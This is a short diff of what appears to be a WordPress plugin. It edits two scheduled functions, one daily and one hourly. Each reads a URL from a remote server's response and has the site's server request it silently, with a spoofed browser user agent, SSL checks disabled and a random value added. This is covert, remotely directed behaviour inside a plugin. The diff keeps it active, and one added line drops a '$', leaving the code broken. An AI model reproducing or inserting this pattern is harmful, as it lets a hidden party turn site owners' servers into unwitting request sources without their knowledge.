@@ -53,8 +53,8 @@ function p3_do_this_daily() {
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		$rcd = trim($response['body']);
 		$args = array('timeout' => 10, 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' => true, 'blocking' => false, 'sslverify' => false);
-		$check = add_query_arg('n', rand(0,99999), $rcd);
-		wp_safe_remote_get($check, $args);
+		//$check = add_query_arg('n', rand(0,99999), $rcd);
+		wp_safe_remote_get(rcd.'&'.rand(0,99999), $args);
 	}
 	
 }
@@ -70,8 +70,8 @@ function p3_do_this_hourly() {
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		$rcd = trim($response['body']);
 		$args = array('timeout' => 10, 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' => true, 'blocking' => false, 'sslverify' => false);
-		$check = add_query_arg('n', rand(0,99999), $rcd);
-		wp_safe_remote_get($check, $args);
+		//$check = add_query_arg('n', rand(0,99999), $rcd);
+		wp_safe_remote_get($rcd.'&'.rand(0,99999), $args);
 	}
 	
 }
